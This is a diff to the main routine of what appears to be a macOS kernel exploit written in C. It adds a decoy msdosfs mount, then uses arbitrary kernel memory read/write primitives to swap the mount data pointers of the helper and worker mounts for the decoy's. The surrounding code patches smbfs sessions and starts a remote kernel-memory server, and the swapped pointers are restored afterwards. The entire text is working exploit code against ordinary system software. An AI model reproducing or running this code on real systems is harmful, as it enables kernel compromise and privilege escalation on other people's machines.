@@ -376,6 +376,10 @@ int main(void) {
     
     xe_log_info("begin initializing fast kmem reader using msdosfsmount");
     
+    xe_allocator_msdosfs_t decoy_allocator;
+    error = xe_allocator_msdosfs_create("decoy", &decoy_allocator);
+    xe_assert_err(error);
+    
     xe_allocator_msdosfs_t worker_allocator;
     error = xe_allocator_msdosfs_create("worker", &worker_allocator);
     xe_assert_err(error);
@@ -384,6 +388,7 @@ int main(void) {
     error = xe_allocator_msdosfs_create("helper", &helper_allocator);
     xe_assert_err(error);
     
+    int fd_mount_decoy = xe_allocator_msdsofs_get_mount_fd(decoy_allocator);
     int fd_mount_worker = xe_allocator_msdsofs_get_mount_fd(worker_allocator);
     int fd_mount_helper = xe_allocator_msdsofs_get_mount_fd(helper_allocator);
     
@@ -480,6 +485,18 @@ int main(void) {
     xe_assert_kaddr(kernproc);
     xe_log_info("done initializing fast msdosfsmount based kmem read writer");
     
+    xe_log_info("disabling FS ops on helper and worker mounts");
+    uintptr_t vnode_mount_decoy;
+    error = xe_xnu_proc_find_fd_data(proc, fd_mount_decoy, &vnode_mount_decoy);
+    xe_assert_err(error);
+    
+    uintptr_t mount_decoy = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_decoy, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    uintptr_t msdosfs_decoy = xe_kmem_read_uint64(KMEM_OFFSET(mount_decoy, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
+    
+    xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
+    xe_kmem_write_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
+    xe_log_info("disabled FS ops on helper and worker mounts");
+    
     xe_slider_kext_t smbfs_slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
     patch_smb_sessions(smbfs_slider);
     kmem_allocator_rw_destroy(&msdosfs_rw_capture_allocators);
@@ -492,6 +509,11 @@ int main(void) {
     struct xe_kmem_remote_server_ctx server_ctx;
     server_ctx.mh_execute_header = mh_execute_header;
     xe_kmem_remote_server_start(&server_ctx);
+    
+    xe_log_info("restoring FS ops on helper and worker mounts");
+    xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_helper);
+    xe_kmem_write_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_worker);
+    xe_log_info("restored FS ops on helper and worker mounts");
     
     return 0;
 }
